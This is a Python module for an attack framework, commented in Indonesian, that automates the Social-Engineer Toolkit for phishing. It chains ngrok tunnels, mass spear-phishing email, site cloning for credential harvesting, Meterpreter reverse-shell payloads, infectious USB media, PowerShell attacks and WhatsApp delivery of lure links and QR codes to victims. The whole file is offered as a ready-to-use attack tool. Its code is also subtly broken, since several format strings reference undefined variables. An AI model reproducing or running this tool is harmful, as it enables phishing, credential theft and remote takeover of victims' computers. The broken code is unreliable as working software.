#!/usr/bin/env python3
# SEToolkit PRO MAX - ALL IN ONE
# Full SET + Ngrok + WhatsApp + QRCode + Mass Mailer + File Upload + Site Cloner + Payload Generator
# Satu modul, satu perintah, target langsung jebol.

MODULE_INFO = {
    "name": "SEToolkit PRO MAX",
    "author": "LazyMaster",
    "description": "ALL SET features + Ngrok + WhatsApp + QR + Mass Mailer + Auto Everything",
    "rank": "Godlike",
    "platform": "Linux",
    "dependencies": ["pywhatkit", "qrcode"]
}

OPTIONS = {
    "LHOST": {"description": "IP / ngrok domain", "required": False, "default": "", "type": "str"},
    "LPORT": {"description": "Port", "required": False, "default": "4444", "type": "str"},
    "EMAIL_LIST": {"description": "File email list (mass mailer)", "required": False, "default": "", "type": "str"},
    "PHONE": {"description": "Nomor WA +62xxx (kirim link/QR)", "required": False, "default": "", "type": "str"},
    "NGROK": {"description": "Auto ngrok? (yes/no)", "required": False, "default": "yes", "type": "str"},
    "CLONE_URL": {"description": "URL untuk clone (harvester)", "required": False, "default": "", "type": "str"},
}

import os, time, json, subprocess, shutil
from pathlib import Path
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich.panel import Panel
from rich import box

console = Console()

def run(session, options):
    # Cek tools
    missing = []
    for tool in ["setoolkit", "ngrok"]:
        if not shutil.which(tool):
            missing.append(tool)
    if missing:
        console.print(f"[red]Install dulu: sudo apt install {' '.join(missing)}[/red]")
        if "ngrok" in missing:
            console.print("[yellow]ngrok: wget https://bin.equinox.io/c/bNyj1mQwqps/ngrok-v3-stable-linux-amd64.tgz && tar xvzf *.tgz && sudo mv ngrok /usr/local/bin[/yellow]")
        return

    try:
        import pywhatkit, qrcode, qrcode.terminal
    except:
        console.print("[red]pip install pywhatkit qrcode[pil] rich[/red]")
        return

    # Ambil opsi
    lhost = options.get("LHOST", "").strip()
    lport = options.get("LPORT", "4444")
    email_list = options.get("EMAIL_LIST", "").strip()
    phone = options.get("PHONE", "").strip()
    use_ngrok = options.get("NGROK", "yes").lower() == "yes"
    clone_url = options.get("CLONE_URL", "").strip()

    # Auto ngrok
    public_host = lhost
    public_port = lport
    if use_ngrok:
        console.print("[cyan]Starting ngrok...[/]")
        proc = subprocess.Popen(["ngrok", "tcp", lport, "--log=stdout"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        time.sleep(5)
        try:
            import requests
            data = requests.get("http://localhost:4040/api/tunnels").json()
            url = data["tunnels"][0]["public_url"]
            public_host = url.split("://")[1].split(":")[0]
            public_port = url.split(":")[-1]
            console.print(f"[bold green]Ngrok → {public_host}:{public_port}[/]")
        except:
            console.print("[red]Ngrok gagal, pakai lokal[/red]")
            public_host, public_port = lhost or "0.0.0.0", lport

    final_lhost = public_host
    final_lport = public_port

    # MENU UTAMA
    attacks = {
        "1": ("Spear-Phishing + Mass Mailer", lambda: mass_attack(email_list)),
        "2": ("Website Attack + Site Cloner", lambda: website_clone(clone_url)),
        "3": ("Payload + Listener (Meterpreter)", lambda: payload_listener()),
        "4": ("QRCode + WhatsApp Sender", lambda: send_qr_whatsapp(phone)),
        "5": ("Infectious Media (USB)", lambda: usb_payload()),
        "6": ("Powershell Attack", lambda: powershell()),
        "7": ("Full SET Interaktif", lambda: subprocess.run(["sudo", "setoolkit"])),
    }

    def launch(config):
        config = config.replace("{LHOST}", final_lhost).replace("{LPORT}", final_lport)
        console.print("[cyan]SEToolkit running...[/]")
        p = subprocess.Popen(["sudo", "setoolkit"], stdin=subprocess.PIPE, text=True, universal_newlines=True)
        p.communicate(input=config)
        console.print("[bold green]Attack selesai![/]")

    def mass_attack(file_list):
        if file_list and os.path.exists(file_list):
            launch(f"1\n1\n{file_list}\n{LHOST}\n{LPORT}\n1\nwindows/meterpreter/reverse_tcp\nYES\n")
        else:
            launch(f"1\n2\n10\n{LHOST}\n{LPORT}\nYES\n")

    def website_clone(url):
        if clone_url:
            launch(f"2\n3\n2\n{url}\nhttp://127.0.0.1:8080\n")
        else:
            url = Prompt.ask("Masukkan URL untuk clone")
            launch(f"2\n3\n2\n{url}\nhttp://127.0.0.1:8080\n")

    def payload_listener():
        payload = Prompt.ask("Payload", choices=["1", "2", "14"], default="1")
        payloads = {"1": "windows/meterpreter/reverse_tcp", "2": "windows/meterpreter/reverse_https", "14": "windows/meterpreter/reverse_tcp"}
        launch(f"4\n2\n{payloads[payload]}\n{LHOST}\n{LPORT}\nx86/shikata_ga_nai\n7\nYES\n")

    def usb_payload():
        launch(f"3\n2\nwindows/meterpreter/reverse_tcp\n{LHOST}\n{LPORT}\nYES\n")

    def powershell():
        launch(f"9\n2\n{LHOST}\n{LPORT}\n")

    def send_qr_whatsapp(phone_num):
        if not phone_num:
            console.print("[red]Set PHONE dulu → set PHONE +6281234567890[/red]")
            return
        link = f"https://{final_lhost}:{final_lport}"
        qr = qrcode.make(link)
        qr_path = "/tmp/target_qr.png"
        qr.save(qr_path)
        console.print(f"[green]QRCode → {qr_path}[/]")
        try:
            import pywhatkit
            pywhatkit.sendwhats_image(phone_num, qr_path, f"BUKA SEKARANG: {link}")
            console.print(f"[bold green]QR + Link terkirim ke {phone_num}[/]")
        except Exception as e:
            console.print(f"[yellow]WhatsApp gagal: {e}[/]")

    # TAMPILKAN MENU
    console.print(Panel.fit("[bold red]SEToolkit PRO MAX - ALL IN ONE[/]", style="bold magenta"))
    table = Table(box=box.DOUBLE_EDGE, title="PILIH SERANGAN", title_style="bold red")
    table.add_column("No", style="cyan")
    table.add_column("Attack Vector", style="white")
    for k, v in attacks.items():
        table.add_row(k, v[0])
    console.print(table)

    choice = Prompt.ask("[bold yellow]Pilih nomor[/]", choices=attacks.keys())
    attacks[choice][1]()

    # FINAL STATUS
    console.print(Panel.fit(
        f"[bold green]SELESAI TOTAL![/]\n"
        f"[white]Listener:[/] [cyan]{final_lhost}:{final_lport}[/]\n"
        f"[white]Ngrok:[/] [green]{'AKTIF' if use_ngrok else 'NONAKTIF'}[/]\n"
        f"[white]WhatsApp:[/] [yellow]{'TERKIRIM' if phone else 'BELUM'}[/]\n"
        f"[white]Clone URL:[/] [blue]{clone_url or 'MANUAL'}[/]",
        title="STATUS AKHIR",
        style="bold blue"
    ))
